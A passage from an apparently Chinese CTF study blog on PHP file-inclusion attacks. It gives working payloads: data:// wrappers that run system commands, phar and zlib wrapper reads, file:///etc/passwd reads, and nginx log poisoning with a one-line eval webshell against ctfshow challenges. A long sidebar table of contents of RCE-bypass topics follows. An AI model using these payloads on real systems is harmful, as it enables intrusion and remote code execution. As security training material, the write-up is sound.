+<p>php://filter 目标使用以下的参数作为它路径的一部分。 复合过滤链能够在一个路径上指定。详细使用这些参数可以参考具体范例。</p>
+<p><img src="https://img-blog.csdnimg.cn/7fead9062043466bb78505946dcc5a4c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><img src="https://img-blog.csdnimg.cn/bce0c29fd13543b89b8e5adc42d7fe24.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p><a href="php://filter的各种过滤器">php://filter的各种过滤器</a></p>
+<h3 id="③data"><a href="#③data" class="headerlink" title="③data://"></a>③data://</h3><p>data://，可以让用户来控制输入流，当它与包含函数结合时，用户输入的data://流会被当作php文件执行</p>
+<p><img src="https://img-blog.csdnimg.cn/b900b99cb04241c6add2a23a1acda2ec.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data://text/plain;base64</span><br></pre></td></tr></table></figure>
+
+<p>读php文件源码：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain,&lt;?php system(&#x27;cat /flag&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>者命令执行：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">data:text/plain,&lt;?php system(&#x27;whoami&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+
+<h3 id="④zip-bzip2-zlib-phar"><a href="#④zip-bzip2-zlib-phar" class="headerlink" title="④zip://,bzip2://,zlib://,phar://"></a>④zip://,bzip2://,zlib://,phar://</h3><p>把shell压缩到zip中，如果file参数可控，可以通过该协议访问压缩包中文件</p>
+<p>payload如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">index.php?file=phar://uploads/flag.zip/flag.php</span><br></pre></td></tr></table></figure>
+
+<p>例子：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">highlight_file(__FILE__);</span><br><span class="line">error_reporting(0);</span><br><span class="line">function filter($file)&#123;</span><br><span class="line">    if(preg_match(&#x27;/filter|\.\.\/|http|https|data|data|rot13|base64|string/i&#x27;,$file))&#123;</span><br><span class="line">        die(&#x27;hacker!&#x27;);</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        return $file;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$file=$_GET[&#x27;file&#x27;];</span><br><span class="line">if(! is_file($file))&#123;</span><br><span class="line">    highlight_file(filter($file));</span><br><span class="line">&#125;else&#123;</span><br><span class="line">    echo &quot;hacker!&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=compress.zlib://flag.php</span><br></pre></td></tr></table></figure>
+
+<h3 id="⑤file伪协议"><a href="#⑤file伪协议" class="headerlink" title="⑤file伪协议"></a>⑤file伪协议</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Linux：http://127.0.0.1/FI/LFI.php?file=file:///etc/passwd		//绝对路径</span><br><span class="line">Windows	：http://192.168.6.128:8001/vulnerabilities/fi/?page=file:///C:\DVWA-master\vulnerabilities\fi\1.txt  //绝对路径</span><br></pre></td></tr></table></figure>
+
+<h3 id="⑥日志包含"><a href="#⑥日志包含" class="headerlink" title="⑥日志包含"></a>⑥日志包含</h3><p>先读取日志文件，发现可以读取</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>或</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=/var/log/nginx/error.log</span><br></pre></td></tr></table></figure>
+
+<p>可以上传一句话木马，进行连接。</p>
+<p>例子：</p>
+<p>ctfshow萌新计划web20</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">if(isset($_GET[&#x27;c&#x27;]))&#123; </span><br><span class="line">       $c=$_GET[&#x27;c&#x27;]; </span><br><span class="line">       if(!preg_match(&quot;/php|file|base|rot/i&quot;,$c))&#123; </span><br><span class="line">               include($c); </span><br><span class="line">       &#125; </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;else&#123; </span><br><span class="line">        highlight_file(__FILE__); </span><br><span class="line">&#125; </span><br><span class="line">?&gt; </span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
+
+<p>burpsuite抓包，修改User-Agent为<code>&lt;?php @eval($_POST[&#39;hack&#39;]);?&gt;</code></p>
+<p><img src="https://img-blog.csdnimg.cn/56c5fc7ac83948769c9b0eb2888304e9.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<p>蚁剑访问：<code>http://chall.ctf.show/?c=/var/log/nginx/access.log</code></p>
+<p><img src="https://img-blog.csdnimg.cn/65c84fa1d7bd4074927d8936ace5420c.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br><img src="https://img-blog.csdnimg.cn/945998c136fc48eb888533f4b92592f0.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3dlaXhpbl80NjcwNjc3MQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
+<h3 id="⑦固定后缀包含-include-c-”-php”"><a href="#⑦固定后缀包含-include-c-”-php”" class="headerlink" title="⑦固定后缀包含 include($c.”.php”);"></a>⑦固定后缀包含 include($c.”.php”);</h3><p>例子：</p>
+<p>ctfshow-web39</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">//flag in flag.</span><br><span class="line">phperror_reporting(0);</span><br><span class="line">if(isset($_GET&#x27;c&#x27;]))&#123;</span><br><span class="line">	$c= $_GET[&#x27;c&#x27;];</span><br><span class="line">	if(!preg_match(&quot;/flag/i&quot;，$c))&#123;</span><br><span class="line">		include($c.&quot;.php&quot;);</span><br><span class="line">	&#125;</span><br><span class="line">&#125;else&#123;</span><br><span class="line">		highlight_file(_FILE__);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>payload：</p>
+<p>使用data协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c=data:text/plain,&lt;?php system(&#x27;cat *&#x27;);?&gt;</span><br></pre></td></tr></table></figure>
+<p><img src="https://img-blog.csdnimg.cn/3e0f9065e4da4074bf2b89588eb1b321.png" alt="在这里插入图片描述"></p>
+<h3 id="⑧利用session-upload-progress进行文件包含"><a href="#⑧利用session-upload-progress进行文件包含" class="headerlink" title="⑧利用session.upload_progress进行文件包含"></a>⑧利用session.upload_progress进行文件包含</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/109281343">利用session.upload_progress进行文件包含</a></p>
+<p>参考</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43625917/article/details/107873787">浅谈PHP无回显命令执行的利用</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/107720578">Perl中GET命令执行</a></p>
+<p><a target="_blank" rel="noopener" href="https://tr0jan.top/archives/74/">无字母数字的webshell</a></p>
+<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">无参数函数RCE</a></p>
+<p><a target="_blank" rel="noopener" href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/#%E6%B3%95%E4%BA%94%EF%BC%9Adirname-amp-chdir">PHP Parametric Function RCE</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/107676580">CTF-RCE-总结（只记录解题方法，不记录具体原理）</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44657899/article/details/109171655">Bypass open_basedir</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_51693574/article/details/111571590?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522162737757416780366586126%2522%252C%2522scm%2522%253A%252220140713.130102334..%2522%257D&request_id=162737757416780366586126&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduend~default-1-111571590.first_rank_v2_pc_rank_v29&utm_term=+file%E4%BC%AA%E5%8D%8F%E8%AE%AE&spm=1018.2226.3001.4187">文件包含中的伪协议</a></p>
+
+        </div>
+        <footer class="kratos-entry-footer clearfix">
+            <div class="footer-tag clearfix">
+                <div class="pull-date">
+                <span>最后编辑：2021-07-29</span>
+                </div>
+            </div>
+        </footer>
+    </div>
+    
+</article>
+
+        
+
+            </section>
+
+        
+
+                
+            
+
+<section id="kratos-widget-area" class="col-md-4 hidden-xs hidden-sm">
+    <!-- 文章和页面根据splitter来分割，没有的话就从头开始设置为sticky -->
+    
+    
+                <aside id="krw-about" class="widget widget-kratos-about clearfix">
+    <div class="photo-background"></div>
+    <div class="photo-wrapper clearfix">
+        <div class="photo-wrapper-tip text-center">
+            <img class="about-photo" src="/images/avatar.webp" />
+        </div>
+    </div>
+    <div class="textwidget">
+        <p class="text-center"></p>
+    </div>
+</aside>
+            
+                    <div class="sticky-area">
+                
+                    <aside id="krw-toc" class="widget widget-kratos-toc clearfix">
+    <div class="photo-background"></div>
+    <h4 class="widget-title no-after">
+        <i class="fa fa-compass"></i>
+        文章目录
+        <span class="toc-progress-bar"></span>
+    </h4>
+    <div class="textwidget">
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E3%80%81RCE%E7%9A%84%E5%AE%9A%E4%B9%89"><span class="toc-text">一、RCE的定义</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E3%80%81RCE%E5%88%A9%E7%94%A8%E5%87%BD%E6%95%B0"><span class="toc-text">二、RCE利用函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E4%BB%A3%E7%A0%81%E6%B3%A8%E5%85%A5"><span class="toc-text">1.代码注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0eval"><span class="toc-text">①eval()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1assert"><span class="toc-text">②assert()</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP-5"><span class="toc-text">PHP 5</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#PHP-7"><span class="toc-text">PHP 7</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2call-user-func-call-user-func-array"><span class="toc-text">③call_user_func()&#x2F;call_user_func_array()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3create-function"><span class="toc-text">④create_function()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A4usort-uasort"><span class="toc-text">⑤usort()&#x2F;uasort()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A5ob-start"><span class="toc-text">⑥ob_start()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A6-php%E4%BB%A3%E7%A0%81"><span class="toc-text">⑦${php代码}</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-text">三、命令执行绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E8%BF%87%E6%BB%A4cat-flag%E7%AD%89%E5%85%B3%E9%94%AE%E8%AF%8D"><span class="toc-text">1.过滤cat,flag等关键词</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E4%BB%A3%E6%9B%BF"><span class="toc-text">①代替</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E4%BD%BF%E7%94%A8%E8%BD%AC%E4%B9%89%E7%AC%A6"><span class="toc-text">②使用转义符</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E5%86%85%E8%81%94%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87"><span class="toc-text">③内联执行绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="toc-text">④变量绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A4%E7%BC%96%E7%A0%81%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">⑤编码进制绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#base64"><span class="toc-text">base64</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#16%E8%BF%9B%E5%88%B6"><span class="toc-text">16进制</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A5%E8%BF%87%E6%BB%A4%E6%96%87%E4%BB%B6%E5%90%8D%E7%BB%95%E8%BF%87"><span class="toc-text">⑥过滤文件名绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E5%88%A9%E7%94%A8%E6%AD%A3%E5%88%99%E5%8C%B9%E9%85%8D%E7%BB%95%E8%BF%87"><span class="toc-text">1) 利用正则匹配绕过</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E5%88%A9%E7%94%A8%E6%9C%AA%E5%88%9D%E5%A7%8B%E5%8C%96%E5%8F%98%E9%87%8F%EF%BC%8C%E4%BD%BF%E7%94%A8-u%E7%BB%95%E8%BF%87"><span class="toc-text">2)利用未初始化变量，使用$u绕过</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A6%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%87%BD%E6%95%B0system-%E7%BB%95%E8%BF%87"><span class="toc-text">⑦命令执行函数system()绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#1-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6%E7%BB%95%E8%BF%87"><span class="toc-text">1)十六进制绕过</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#2-%E6%8B%AC%E5%8F%B7%E7%BB%95%E8%BF%87"><span class="toc-text">2)括号绕过</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#3-%E4%BD%BF%E7%94%A8%E5%86%85%E6%95%9B%E6%89%A7%E8%A1%8C%E4%BB%A3%E6%9B%BFsystem"><span class="toc-text">3)使用内敛执行代替system</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A7%E4%BD%BF%E7%94%A8-%E5%92%8C-%EF%BC%8C-x-%E6%95%B0%E5%AD%97"><span class="toc-text">⑧使用$*和$@，$x,${数字}</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A8%E5%85%B6%E4%BB%96%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6%E6%96%B9%E5%BC%8F"><span class="toc-text">⑨其他读取文件方式</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#dir%E4%B8%8Els%E7%9A%84%E4%BB%A3%E6%9B%BF"><span class="toc-text">dir与ls的代替</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E8%BF%87%E6%BB%A4%E7%A9%BA%E6%A0%BC"><span class="toc-text">2.过滤空格</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-%E8%BF%87%E6%BB%A4%E7%9B%AE%E5%BD%95%E5%88%86%E9%9A%94%E7%AC%A6"><span class="toc-text">3.过滤目录分隔符 (&#x2F;)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-%E8%BF%87%E6%BB%A4%E5%88%86%E9%9A%94%E7%AC%A6-amp"><span class="toc-text">4.过滤分隔符 | &amp; ;</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%8F%AF%E4%BB%A5%E4%BD%BF%E7%94%A8-0a%E4%BB%A3%E6%9B%BF%EF%BC%8C-0a%E5%85%B6%E5%AE%9E%E5%9C%A8%E6%9F%90%E7%A7%8D%E7%A8%8B%E5%BA%A6%E4%B8%8A%E6%98%AF%E6%9C%80%E6%A0%87%E5%87%86%E7%9A%84%E5%91%BD%E4%BB%A4%E9%93%BE%E6%8E%A5%E7%AC%A6%E5%8F%B7"><span class="toc-text">①可以使用%0a代替，%0a其实在某种程度上是最标准的命令链接符号</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-gt-%E4%BB%A3%E6%9B%BF"><span class="toc-text">②?&gt;代替;</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%95%BF%E5%BA%A6%E5%8F%97%E9%99%90"><span class="toc-text">5.字符串长度受限</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-text">6.无回显</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0shell-exec%E7%AD%89%E6%97%A0%E5%9B%9E%E6%98%BE%E5%87%BD%E6%95%B0%E3%80%82"><span class="toc-text">①shell_exec等无回显函数。</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A4%E6%96%AD%E6%96%B9%E6%B3%95%EF%BC%9A"><span class="toc-text">判断方法：</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%88%A9%E7%94%A8%EF%BC%9A"><span class="toc-text">利用：</span></a><ol class="toc-child"><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%85%A0-%E5%A4%8D%E5%88%B6%EF%BC%8C%E5%8E%8B%E7%BC%A9%EF%BC%8C%E5%86%99shell%E7%AD%89%E6%96%B9%E6%B3%95"><span class="toc-text">Ⅰ.复制，压缩，写shell等方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%85%A1-%E5%8E%8B%E7%BC%A9%E6%96%B9%E6%B3%95"><span class="toc-text">Ⅱ.压缩方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%85%A2-%E5%86%99shell%E6%96%B9%E6%B3%95"><span class="toc-text">Ⅲ.写shell方法</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%85%A3-%E5%9C%A8vps%E4%B8%8A%E5%BB%BA%E7%AB%8B%E8%AE%B0%E5%BD%95%E8%84%9A%E6%9C%AC"><span class="toc-text">Ⅳ.在vps上建立记录脚本</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%85%A4-%E9%80%9A%E8%BF%87http%E8%AF%B7%E6%B1%82"><span class="toc-text">Ⅴ.通过http请求</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%85%A5-DNS%E8%AF%B7%E6%B1%82"><span class="toc-text">Ⅵ.DNS请求</span></a></li><li class="toc-item toc-level-6"><a class="toc-link" href="#%E2%85%A6-linux-tee%E5%91%BD%E4%BB%A4"><span class="toc-text">Ⅶ.linux tee命令</span></a></li></ol></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1-dev-null-2-gt-amp-1%E7%B1%BB%E6%97%A0%E5%9B%9E%E6%98%BE"><span class="toc-text">②&#x2F;dev&#x2F;null 2&gt;&amp;1类无回显</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#7-Perl%E4%B8%ADopen%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%EF%BC%88GET%EF%BC%89"><span class="toc-text">7.Perl中open命令执行（GET）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E4%BD%BF%E7%94%A8GET%E8%AF%BB%E5%8F%96%E6%96%87%E4%BB%B6"><span class="toc-text">①使用GET读取文件</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E4%BD%BF%E7%94%A8GET%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">②使用GET执行命令</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#8-%E6%97%A0%E6%95%B0%E5%AD%97%E5%AD%97%E6%AF%8Dgetshell"><span class="toc-text">8.无数字字母getshell</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%8F%96%E5%8F%8D"><span class="toc-text">①取反</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%BC%82%E6%88%96"><span class="toc-text">②异或</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E6%88%96%E8%BF%90%E7%AE%97"><span class="toc-text">③或运算</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#9-%E8%BF%87%E6%BB%A4%E6%8B%AC%E5%8F%B7"><span class="toc-text">9.过滤括号</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E4%BD%BF%E7%94%A8%E4%B8%8D%E9%9C%80%E8%A6%81%E6%8B%AC%E5%8F%B7%E7%9A%84%E5%87%BD%E6%95%B0"><span class="toc-text">①使用不需要括号的函数</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#echo"><span class="toc-text">echo</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#require"><span class="toc-text">require</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#10-%E6%97%A0%E5%8F%82%E6%95%B0RCE"><span class="toc-text">10.无参数RCE</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0getenv"><span class="toc-text">①getenv()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1getallheaders"><span class="toc-text">②getallheaders()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2get-defined-vars"><span class="toc-text">③get_defined_vars()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A3session-id"><span class="toc-text">④session_id()</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A4dirname-amp-chdir"><span class="toc-text">⑤dirname() &amp; chdir()</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#11-%E5%86%85%E6%95%9B%E6%89%A7%E8%A1%8C"><span class="toc-text">11.内敛执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#12-open-basedir%E7%BB%95%E8%BF%87"><span class="toc-text">12.open_basedir绕过</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A0%E5%88%A9%E7%94%A8chdir-%E4%B8%8Eini-set-%E7%BB%84%E5%90%88%E7%BB%95%E8%BF%87"><span class="toc-text">①利用chdir()与ini_set()组合绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A1%E5%88%A9%E7%94%A8glob-%E4%BC%AA%E5%8D%8F%E8%AE%AE%E7%BB%95%E8%BF%87"><span class="toc-text">②利用glob:&#x2F;&#x2F;伪协议绕过</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E2%91%A2%E5%88%A9%E7%94%A8syslink-%E5%87%BD%E6%95%B0%E7%BB%95%E8%BF%87"><span class="toc-text">③利用syslink()函数绕过</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#13-disable-function%E7%BB%95%E8%BF%87"><span class="toc-text">13.disable_function绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#14-%E9%80%9A%E9%85%8D%E7%AC%A6-%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E8%B0%83%E7%94%A8%E5%91%BD%E4%BB%A4"><span class="toc-text">14.通配符+绝对路径调用命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#15-grep%E7%BB%95%E8%BF%87%E5%85%B3%E9%94%AE%E8%AF%8D%E8%BF%87%E6%BB%A4"><span class="toc-text">15.grep绕过关键词过滤</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#16-%E4%BD%BF%E7%94%A8-%E6%9E%84%E9%80%A0%E6%95%B0%E5%AD%97"><span class="toc-text">16.使用~$()构造数字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#17-%E7%BB%95%E8%BF%87disable-functions"><span class="toc-text">17.绕过disable_functions</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#18-%E5%88%A9%E7%94%A8php%E5%86%85%E7%BD%AE%E7%B1%BBrce"><span class="toc-text">18.利用php内置类rce</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A0%E5%88%A9%E7%94%A8-FilesystemIterator-%E8%8E%B7%E5%8F%96%E6%8C%87%E5%AE%9A%E7%9B%AE%E5%BD%95%E4%B8%8B%E7%9A%84%E6%89%80%E6%9C%89%E6%96%87%E4%BB%B6"><span class="toc-text">①利用 FilesystemIterator 获取指定目录下的所有文件</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E2%91%A1%E4%BD%BF%E7%94%A8PHP%E7%9A%84%E5%8F%8D%E5%B0%84%E7%B1%BBReflectionClass%E3%80%81ReflectionMethod%E5%92%8CPHP%E5%BC%82%E5%B8%B8%E5%A4%84%E7%90%86-Exception%E6%9D%A5rce"><span class="toc-text">②使用PHP的反射类ReflectionClass、ReflectionMethod和PHP异常处理 Exception来rce</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#19-PATH%E7%8E%AF%E5%A2%83%E5%8F%98%E9%87%8F%E7%BB%95%E8%BF%87"><span class="toc-text">19.$PATH环境变量绕过</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9B%9B%E3%80%81%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-text">四、文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A0php-input"><span class="toc-text">①php:&#x2F;&#x2F;input</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A1-php-filter"><span class="toc-text">②.php:&#x2F;&#x2F;filter</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A2data"><span class="toc-text">③data:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A3zip-bzip2-zlib-phar"><span class="toc-text">④zip:&#x2F;&#x2F;,bzip2:&#x2F;&#x2F;,zlib:&#x2F;&#x2F;,phar:&#x2F;&#x2F;</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E2%91%A4file%E4%BC%AA%E5%8D%8F%E8%AE%AE"><span class="toc-text">⑤file伪协议</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" 